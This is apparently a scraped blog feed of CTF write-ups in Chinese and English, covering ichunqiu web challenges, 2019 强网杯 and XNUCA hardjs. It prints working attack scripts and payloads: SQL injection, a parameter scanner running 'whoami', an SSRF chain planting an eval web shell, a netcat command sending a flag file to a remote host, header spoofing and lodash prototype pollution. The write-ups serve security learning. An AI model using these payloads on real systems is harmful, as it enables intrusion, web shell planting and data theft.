<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5_write</span><span class="params">(begin,end,filename)</span>:</span></span><br><span class="line">    mutex.acquire()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"begin count md5 value from %s to %s"</span> %(str(begin),str(end))</span><br><span class="line">    mutex.release()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(begin,end):</span><br><span class="line">        tmp = hashlib.md5(str(i))</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        filename.write(<span class="string">'u/'</span>+str(tmp.hexdigest())+<span class="string">'.txt'</span>+<span class="string">'\n'</span>)</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    threads = []</span><br><span class="line">    f = open(<span class="string">'dict.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line">    t1 = threading.Thread(target=md5_write, args=(<span class="number">1</span>,<span class="number">250</span>,f))</span><br><span class="line">    t2 = threading.Thread(target=md5_write, args=(<span class="number">250</span>,<span class="number">500</span>,f))</span><br><span class="line">    t3 = threading.Thread(target=md5_write, args=(<span class="number">500</span>,<span class="number">750</span>,f))</span><br><span class="line">    t4 = threading.Thread(target=md5_write, args=(<span class="number">750</span>,<span class="number">1000</span>,f))</span><br><span class="line">    threads.append(t1)</span><br><span class="line">    threads.append(t2)</span><br><span class="line">    threads.append(t3)</span><br><span class="line">    threads.append(t4)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
<p>The script to get flag:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://c726f71499614c9caa416ae33040d067dee7bc7a06e34089.changame.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(line)</span>:</span></span><br><span class="line">    res = requests.get(url+line)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">        mutex.acquire()</span><br><span class="line">        <span class="keyword">print</span> res.content</span><br><span class="line">        mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    f = open(<span class="string">'dict.txt'</span>)</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="comment"># important to add a ',' , which indicate the number of parameters</span></span><br><span class="line">        s = threading.Thread(target = get_flag, args = (line, ))</span><br><span class="line">        threads.append(s)</span><br><span class="line"></span><br><span class="line">    data = &#123;</span><br><span class="line">            <span class="string">'token'</span>:<span class="string">'hello'</span></span><br><span class="line">            &#125;</span><br><span class="line">    res = requests.get(url,cookies=data)</span><br><span class="line">    <span class="keyword">print</span> res.content</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> threading.active_count() &lt; <span class="number">3</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
<h2 id="2019-强网杯-高明的黑客">2019 强网杯 高明的黑客</h2>
<p>下载源码有30mb，超过三千个文件，每个文件内部都是类似于这样的内容</p>
<p><img src="https://user-images.githubusercontent.com/40637063/58483762-6e2b0700-8193-11e9-9d00-fb36d55a8adf.png" alt="image"></p>
<p>完全没有办法阅读，而且不少代码是无效代码。</p>
<p>但是很多文件内部都有get和post，甚至可以看见eval的影子。</p>
<p>所以猜测可能某个文件内的某个参数是有效而且是可以执行的。</p>
<p>扫描脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Detect</span><span class="params">(file)</span>:</span></span><br><span class="line">    mutex.acquire()</span><br><span class="line">    <span class="keyword">print</span> file</span><br><span class="line">    mutex.release()</span><br><span class="line">    f = open(file, <span class="string">'r'</span>)</span><br><span class="line">    flines = f.readlines()</span><br><span class="line"></span><br><span class="line">    content = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> flines:</span><br><span class="line">        content += line</span><br><span class="line"></span><br><span class="line">    get_result = re.findall(<span class="string">r"\$_GET\['(.*?)'\]"</span>, content)</span><br><span class="line">    post_result = re.findall(<span class="string">r"\$_POST\['(.*?)'\]"</span>, content)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> get_result:</span><br><span class="line">        res = session.get(url + str(file) +<span class="string">"?"</span> + i + <span class="string">"="</span> + <span class="string">"whoami"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'www-data'</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            <span class="keyword">print</span> str(file) + <span class="string">"is vulunable with parameter %s"</span> % i </span><br><span class="line">            finaltarget.append(str(file))</span><br><span class="line">            finaltarget.append(i)</span><br><span class="line">            mutex.release()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> post_result:</span><br><span class="line">        data = &#123;i:<span class="string">"whoami"</span>&#125;</span><br><span class="line">        res = session.post(url + str(file), data = data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"www-data"</span> <span class="keyword">in</span> res.content:</span><br><span class="line">            mutex.acquire()</span><br><span class="line">            <span class="keyword">print</span> str(file) + <span class="string">"is vulunable with post parameter %s"</span> % i</span><br><span class="line">            finaltarget.append(str(file))</span><br><span class="line">            finaltarget.append(i)</span><br><span class="line">            mutex.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    finaltarget = []</span><br><span class="line">    url = <span class="string">"http://127.0.0.1/"</span></span><br><span class="line">    ct = time.time()</span><br><span class="line">    session = requests.session()</span><br><span class="line">    mutex = threading.Lock()</span><br><span class="line">    path = <span class="string">'src/'</span></span><br><span class="line">    files = os.listdir(path)</span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        t = threading.Thread(target = Detect, args = (path + file,))</span><br><span class="line">        threads.append(t)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        t.start()</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> threading.active_count() &lt; <span class="number">30</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> finaltarget</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Time used:"</span></span><br><span class="line">    <span class="keyword">print</span> time.time() - ct</span><br></pre></td></tr></table></figure>
<p><img src="https://user-images.githubusercontent.com/40637063/58484538-d6c6b380-8194-11e9-8abd-872dfbe583b5.png" alt="image"></p>
<h2 id="ichunqiu-Look">ichunqiu Look</h2>
<p>refresh the page with burpsuite , and here comes the hint:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">X-HT: verify</span><br></pre></td></tr></table></figure>
<p>and payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">index.php?verify=&apos;=0%23</span><br></pre></td></tr></table></figure>
<p>it is the shortest password.</p>
<p>…</p>
<p>…</p>
<p>Got the source code:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$con = mysql_connect(<span class="string">'localhost'</span>,<span class="string">'root'</span>,<span class="string">''</span>);</span><br><span class="line">mysql_query(<span class="string">"set names utf8"</span>);</span><br><span class="line">mysql_select_db(<span class="string">"ctf"</span>);</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">"REMOTE_ADDR"</span>]==<span class="string">'8.8.8.8'</span>)&#123;</span><br><span class="line">    $name = addslashes($_GET[<span class="string">'usern3me'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(stripos($_GET[<span class="string">'usern3me'</span>],<span class="string">'Bctf2O16'</span>)!==<span class="keyword">false</span>)&#123;</span><br><span class="line">        $name = <span class="string">'FUCK'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $name = addslashes($_GET[<span class="string">'usern3me'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello '</span>.$name;</span><br><span class="line">$sql = <span class="string">"select * from admin where name='$name'"</span>;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$num = mysql_num_rows($result);</span><br><span class="line"><span class="keyword">if</span>($num&gt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;br&gt;next ***.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>MYSQL 中 utf8_unicode_ci 和 utf8_general_ci 两种编码格式, utf8_general_ci不区分大小写,<br>
Ä = A, Ö = O, Ü = U 这三种条件都成立, 对于utf8_general_ci下面的等式成立：ß = s<br>
，但是，对于utf8_unicode_ci下面等式才成立：ß = ss 。<br>
可以看到大写O和Ö是相等的</p>
</blockquote>
<p>payload:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5211ec9dde53ee65bb02225117fba1e1.php?usern3me=Bctf2Ö16</span><br></pre></td></tr></table></figure>
<p>Got another source code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'path'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    $path = $_GET[<span class="string">'path'</span>];</span><br><span class="line">    $name = <span class="string">"upload/"</span>.$_GET[<span class="string">'filename'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(strpos($name,<span class="string">'..'</span>) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'WTF'</span>;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strpos($path,<span class="string">'http://127.0.0.1/'</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">    file_put_contents($name,file_get_contents($path));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'path error'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>With <code>http://127.0.0.1/</code> been detected, payloads like <code>http://127.0.0.1:test@www.baidu.com</code> can not be used. But we can utilize the page before , as it will show <code>usern3me</code> content on page</p>
<p><img src="https://user-images.githubusercontent.com/40637063/59102510-e1d0cf00-895e-11e9-9d95-66589f9ad9ee.png" alt="image"></p>
<p>so our last payload should be like:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://100a280ce70e4481b698495023409e196beeb4c27c204fdb.changame.ichunqiu.com/c3368f5eb5f8367fd548b228bee69ef2.php?path=http://127.0.0.1/5211ec9dde53ee65bb02225117fba1e1.php?usern3me=&lt;?php @eval($_POST[0]);&gt;&amp;filename=shell.php</span><br></pre></td></tr></table></figure>
<p>and call <code>shell.php</code>, Posting data like</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0=echo `cat ../flag_is_here.php`;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>Ps: what if the filter condition was <strong><a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></strong> instead of <strong><a href="http://127.0.0.1/" target="_blank" rel="noopener">http://127.0.0.1/</a></strong> ? Think about URL’s structure: <strong>scheme://user:pass@host:port/path?query=value#fragment</strong></p>
<p>Using payload <a href="http://127.0.0.1:test@www.baidu.com" target="_blank" rel="noopener">http://127.0.0.1:test@www.baidu.com</a> , you can bypass it and visit <a href="http://baidu.com" target="_blank" rel="noopener">baidu.com</a>.</p>
</blockquote>
<h2 id="ichunqiu-try">ichunqiu try</h2>
<p>to generate hash crash:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'1.txt'</span>,<span class="string">'w+'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">10000000</span>,<span class="number">40000000</span>):</span><br><span class="line">    f.write(str(i) + <span class="string">' '</span> + crypt.crypt(str(i), <span class="string">'$6$rounds=66'</span>))</span><br><span class="line"></span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> crypt</span><br><span class="line"></span><br><span class="line">token_url = <span class="string">"http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/level.php?name=%27%20union%20select%20token%20from%20token%23"</span></span><br><span class="line"></span><br><span class="line">reset_url = <span class="string">"http://902bdd4e83e54133a6f850f6b12c6e236da12c85e6dc43c9.changame.ichunqiu.com/reset.php"</span></span><br><span class="line"></span><br><span class="line">reset_data = &#123;</span><br><span class="line">        <span class="string">"username"</span>:<span class="string">"member"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reset_and_get_token</span><span class="params">()</span>:</span></span><br><span class="line">    requests.post(reset_url, data=reset_data)</span><br><span class="line">    res = requests.get(token_url).content</span><br><span class="line">    token = re.findall(<span class="string">r"level is (.*)"</span>, res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        token = reset_and_get_token()</span><br><span class="line">        f = open(<span class="string">"1.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line">        lines = f.read()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            <span class="keyword">if</span> token <span class="keyword">in</span> line:</span><br><span class="line">                <span class="keyword">print</span> line</span><br><span class="line">                exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h2 id="ichunqiu-fuzzing">ichunqiu fuzzing</h2>
<p><code>hint: ip,Large internal network</code></p>
<p>trying <code>192.168.0.0</code> (or other ipsegment like <code>10.0.0.0</code>: ) with <code>client-ip</code> or <code>x-forwarded-for</code> …, , and the callback let us show the key,</p>
<blockquote>
<p>ps : several http headers to fake ip:</p>
<p>X-Forwarded-For</p>
<p>Client-ip</p>
<p>x-remote-ip</p>
<p>x-originating-IP</p>
<p>x-remote-addr</p>
</blockquote>
<p>right click in burpsuite’s repeater and change to request’s method , add <code>key</code> and send the request …</p>
<p>…</p>
<p>…</p>
<p>finally we got the code as follows and a cipher.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0) &#123;</span><br><span class="line">	$ckey_length = 4;</span><br><span class="line"></span><br><span class="line">	$key = md5($key ? $key : UC_KEY);</span><br><span class="line">	$keya = md5(substr($key, 0, 16));</span><br><span class="line">	$keyb = md5(substr($key, 16, 16));</span><br><span class="line">	$keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line"></span><br><span class="line">	$cryptkey = $keya . md5($keya . $keyc);</span><br><span class="line">	$key_length = strlen($cryptkey);</span><br><span class="line"></span><br><span class="line">	$string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;%010d&apos;, $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string;</span><br><span class="line">	$string_length = strlen($string);</span><br><span class="line"></span><br><span class="line">	$result = &apos;&apos;;</span><br><span class="line">	$box = range(0, 255);</span><br><span class="line"></span><br><span class="line">	$rndkey = array();</span><br><span class="line">	for ($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">		$rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for ($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">		$j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">		$tmp = $box[$i];</span><br><span class="line">		$box[$i] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	for ($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">		$a = ($a + 1) % 256;</span><br><span class="line">		$j = ($j + $box[$a]) % 256;</span><br><span class="line">		$tmp = $box[$a];</span><br><span class="line">		$box[$a] = $box[$j];</span><br><span class="line">		$box[$j] = $tmp;</span><br><span class="line">		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if ($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">		if ((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16)) &#123;</span><br><span class="line">			return substr($result, 26);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			return &apos;&apos;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else &#123;</span><br><span class="line">		return $keyc . str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">just decode it using function.</span><br><span class="line"></span><br><span class="line">## ichunqiu not found</span><br><span class="line"></span><br><span class="line">访问，抓包，看回显：</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57923178-21fadf80-78d4-11e9-88dd-179d35e9cc72.png)</span><br><span class="line"></span><br><span class="line">``X-method`` 显示haha，提示请求方法错误，尝试``POST`` ``OPTIONS`` ``HEAD`` 三种方法之后，看到``OPTIONS`` 的回显有``?f=1.php`` ：</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57923374-b5ccab80-78d4-11e9-8267-fb7d6bf0269a.png)</span><br><span class="line"></span><br><span class="line">带参数访问，可以看到1.php的源代码，但是访问不了flag.php 和index.php， </span><br><span class="line"></span><br><span class="line">``Apache`` 的根目录下常常有``.htaccess`` 文件。</span><br><span class="line"></span><br><span class="line">&gt; .htaccess文件(或者&quot;分布式配置文件&quot;)提供了针对每个目录改变配置的方法，即在一个特定的目录中放置一个包含指令的文件，其中的指令作用于此目录及其所有子目录。</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924740-8455df00-78d8-11e9-946b-7107b2970485.png)</span><br><span class="line"></span><br><span class="line">然后访问下面的html，</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924856-deef3b00-78d8-11e9-9cf7-05477e0c1ad7.png)</span><br><span class="line"></span><br><span class="line">添加``x-forwarded-for: 127.0.0.1`` 无效，用``client-ip: 127.0.0.1`` 就可以了。</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/57924816-c2530300-78d8-11e9-8199-23ffb61c4149.png)</span><br><span class="line"></span><br><span class="line">## ichunqiu exec</span><br><span class="line"></span><br><span class="line">查看源码提示``vim`` ，查看``.index.php.swp`` 并用vim恢复，得到以下代码</span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"> &lt;?php /* flag in flag233.php */  </span><br><span class="line">     function check($number) &#123;</span><br><span class="line">     $one = ord(&apos;1&apos;);</span><br><span class="line">     $nine = ord(&apos;9&apos;);</span><br><span class="line">     for ($i = 0; $i &lt; strlen($number); $i++)</span><br><span class="line">     &#123;</span><br><span class="line">         $digit = ord($number&#123;$i&#125;);</span><br><span class="line">         if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">         &#123;</span><br><span class="line">             return false;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     return $number == &apos;11259375&apos;;</span><br><span class="line"> &#125;</span><br><span class="line">if(isset($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">    setcookie(&apos;auth&apos;,&apos;tcp tunnel is forbidden!&apos;);</span><br><span class="line">    if(isset($_POST[&apos;cmd&apos;]))&#123;</span><br><span class="line">        $command=$_POST[cmd];</span><br><span class="line">        $result=exec($command);</span><br><span class="line">        //echo $result;</span><br><span class="line">    &#125; &#125;else&#123; 	die(&apos;no sign&apos;); &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里要求传入数据弱等于’11259375’，但是数据的每一位都不能在0-9之间，那么可以传入<code>11259375</code>  的十六进制也就是<code>0xabcdef</code> ，然后执行cmd，但是代码中说不能执行<code>tcp</code> 的连接，那么采用<code>udp</code> 的方式进行连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd=nc -u xxx.xxx.xxx.xxx 1111 &lt; flag233.php</span><br></pre></td></tr></table></figure>
<p>服务器开启：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -ul 1111</span><br></pre></td></tr></table></figure>
<p><code>-u</code> 是开启udp模式的意思。</p>
<h2 id="ichunqiu百度杯-登录">ichunqiu百度杯 登录</h2>
<p>前面内容和数据库有关。</p>
<p>登录进去之后看到有<code>.bctfg1t</code> 字段，像是<code>.git</code> 泄露，访问被403，访问<code>/.bctfg1t/config</code> 成功说明的确是git泄露，使用<code>Githack</code> 把全部内容下载下来。可以看见一些sh1字符串。</p>
<p>使用<code>git log</code> 查看历史版本，使用得到的<code>commit</code> 编号进行<code>git reset --hard {commit}</code> ，然而没有用。</p>
<p>考察<code>缓存机制</code> ，在<code>git</code> 中，缓存就是<code>stach</code> ，进入<code>.git/refs/</code> ，然后<code>cat stach</code> 得到了commit，回到下载的根目录执行<code>git reset --hard commit</code> 之后查看<code>flag.php</code> 就行了</p>
]]></content>
      <categories>
        <category>题型记录</category>
      </categories>
  </entry>
  <entry>
    <title>javascript 原型链污染学习中的一点小问题</title>
    <url>/2019/11/17/javascript-learn/</url>
    <content><![CDATA[<p>不会javascript, 在看smi1e师傅关于原型链污染攻击的博客时候, 这张图片让我思考了很久</p>
<p><img src="https://user-images.githubusercontent.com/40637063/69004994-4e141d80-0956-11ea-8a97-a946b681ac75.png" alt="image"></p>
<p>很勉强的自己给自己找到一个比喻: cat.prototype是一个对象, 比作仓库, 仓库里面有按照一定顺序摆放的货物, constructor是在这些货物的基础上做的修改, 比如增加什么东西减去什么东西改变什么东西的顺序之类的. 没有constructor, 仓库就是静态的一个仓库, 也就是对象, 但是如果将constructor实施的话, 就是产生一个拥有新货物的仓库, 也就是cat实例对象, 那么类又是什么概念? 就像是给仓库定下一个整理计划, 这个计划叫做constructor, 而这个计划还没有实施, 你说他是静态的仓库(对象)似乎不妥, 因为有计划的存在, 这个仓库是可变的, 这个状态可以变化的仓库就叫做类.</p>
<p>当然这种比喻很牵强, 我也不知道合不合理, 也只是为了更好理解原型链污染而做的臆想…</p>
<p>然后对于p师傅博客中写道关于字典赋值proto无效的问题,实验了一下:</p>
<p><img src="https://user-images.githubusercontent.com/40637063/69007214-fc7b8b00-0975-11ea-9f53-bf96932750ea.png" alt="image"></p>
<p>字典在创立的时候应该是先创立字典内的项然后将他们聚合起来, 那么在创立a的时候先创立的是a的原型, 然后再创立的a, 这也就解释了为什么bar传不到Object中去,而是传入了Object的下一级, 也就是a的原型.</p>
<h2 id="2019-XNUCA-hardjs-复现">2019 XNUCA hardjs 复现</h2>
<p>页面功能: 注册 登录 发表评论</p>
<p>拿到源代码之后首先使用命令<code>npm audit</code>来自动检测一下是否有存在漏洞的依赖包</p>
<p><img src="/images/image-20200123220813194.png" alt="image-20200123220813194"></p>
<p>一个原型链污染漏洞, 好的. 看下<code>lodash</code>是干啥的</p>
<p><img src="/images/image-20200123220954191.png" alt="image-20200123220954191"></p>
<p>查看源代码部分看看在哪里用到了这个<code>lodash</code></p>
<p><img src="/images/image-20200123221147765.png" alt="image-20200123221147765"></p>
<p>大意是访问<code>/get</code>路由就会从根据userid从数据库中查询出消息, 判断条数, 如果大于5条的话, 就会对每一条都进行一个<code>lodash.defaultsDeep</code>函数处理, 查查看payload</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure>
<p>那么构造一个类似的应该就可以污染任意参数了.</p>
<p>然后思路是想通过xss让对面的bot将作为flag的password发送出来, 但是和传统的发送url链接让对面bot查看的方式不一样, 我们没有这么个玩意. 那么想要xss怎么办? 只能伪造登录进bot的账号, 再在bot的消息列表中插入xss代码, 等对面查看的时候就可以触发了, 那么怎么伪造登录呢?</p>
<p>查看一下登录验证的代码</p>
<p><img src="/images/image-20200123224339539.png" alt="image-20200123224339539"></p>
<p>好, 那么可以考虑一下把<code>login</code>还有<code>userid</code>这俩都给污染成true</p>
<p><img src="/images/image-20200123224551590.png" alt="image-20200123224551590"></p>
<p>多发几次然后路由访问<code>/get</code>去触发一下, 把cookie都删掉重新访问后就会发现成功以userid=1的身份登录了.</p>
<p>登录完之后就要考虑怎么在页面中插入xss代码了</p>
<p>在app.js中有这么一段</p>
<p><img src="/images/image-20200123233543747.png" alt="image-20200123233543747"></p>
<p>这个<code>$.extend</code>相当于合并数组, 这种操作也可以造成原型链污染,<code>CVE-2019-11358</code> 再来看页面渲染的部分</p>
<p><img src="/images/image-20200123235223013.png" alt="image-20200123235223013"></p>
<p>会把符合条件的hints标签都拿出来渲染一遍, 在这个过程中会将沙盒作用在这些标签上</p>
<p><img src="/images/image-20200123235208032.png" alt="image-20200123235208032"></p>
<p>也就是为什么在如图地方直接写xss代码会无效的原因</p>
<p><img src="/images/image-20200123235558341.png" alt="image-20200123235558341"></p>
<p>观察渲染模板<code>index.ejs</code>, 发现有一个标签<code>logger</code>不在沙盒限制中并且符合条件, 那么, 可以污染hints让他的原型中包含logger从而让hints在遍历的过程中遍历到logger然后去渲染他, logger里的内容自然是post表单了.</p>
<p><img src="/images/image-20200123233034091.png" alt="image-20200123233034091"></p>
<p>还有一种解法, 等我会调试js了就去补</p>
]]></content>
  </entry>
  <entry>
    <title>java_web题目复现记录[working forever]</title>
